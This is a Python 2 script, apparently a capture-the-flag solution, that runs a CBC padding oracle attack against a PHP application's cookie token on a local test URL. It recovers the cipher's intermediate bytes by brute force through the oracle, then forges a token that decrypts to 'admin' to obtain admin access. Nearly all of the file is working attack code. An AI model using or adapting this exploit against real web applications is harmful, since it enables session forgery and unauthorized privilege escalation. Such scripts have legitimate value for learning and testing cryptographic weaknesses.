import base64

import requests

url = 'http://127.0.0.1/aaaa.php'
N = 16
data = { 'username' : 'admin', 'password' : 'admin' }


def inject_token( token, redirect ) :
	header = { "Cookie" : "PHPSESSID=" + phpsession + ";token=" + token }
	result = requests.post( url, headers = header, allow_redirects = redirect )
	return result


def xor( a, b ) :
	return "".join( [chr( ord( a[i] ) ^ ord( b[i % len( b )] ) ) for i in xrange( len( a ) )] )


def pad( string, N ) :
	l = len( string )
	if l != N :
		return string + chr( N - l ) * (N - l)


def padding_oracle( N ) :
	get = ""
	for i in xrange( 1, N + 1 ) :
		for j in xrange( 0, 256 ) :
			padding = xor( get, chr( i ) * (i - 1) )
			c = chr( 0 ) * (16 - i) + chr( j ) + padding
			result = inject_token( base64.b64encode( c ), False )
			if "Error!" not in result.content :
				get = chr( j ^ i ) + get
				print chr( j ^ i ).encode('hex'),
				break
	return get


count = 0
while True :
	count += 1
	print '[*] ********* The %dth Round *********' % count
	session = requests.post( url, data = data, allow_redirects = False ).headers['Set-Cookie'].split( ',' )
	phpsession = session[0].split( ";" )[0][10 :]
	print '[+] PHPESSID: ' + phpsession
	token = session[1][6 :].replace( "%3D", '=' ).replace( "%2F", '/' ).replace( "%2B", '+' ).decode( 'base64' )
	print '[+] Token: ' + token

	print '[*] Getting middle...'
	middle = padding_oracle( N )
	print '[+] Middle1: ' + str(middle.encode('hex'))
	print '[*] Done.'
	if (len( middle ) + 1 == 16) :
		for i in xrange( 0, 256 ) :
			_middle = chr( i ) + middle
			print "[+] Token: " + token
			print "[+] Middle: " + _middle.encode( 'hex' )
			plaintext = xor( _middle, token );
			print "[+] Plaintext: " + plaintext
			des = pad( 'admin', N )
			tmp = ""
			print "[+] DES('admin') hex:" + des.encode("hex")
			for i in xrange( 16 ) :
				tmp += chr( ord( token[i] ) ^ ord( plaintext[i] ) ^ ord( des[i] ) )
			print "[*] Hex:" + tmp.encode('hex')
			result = inject_token( base64.b64encode( tmp ), True )
			if "You are admin!" in result.content :
				print result.content
				print "success"
				exit()
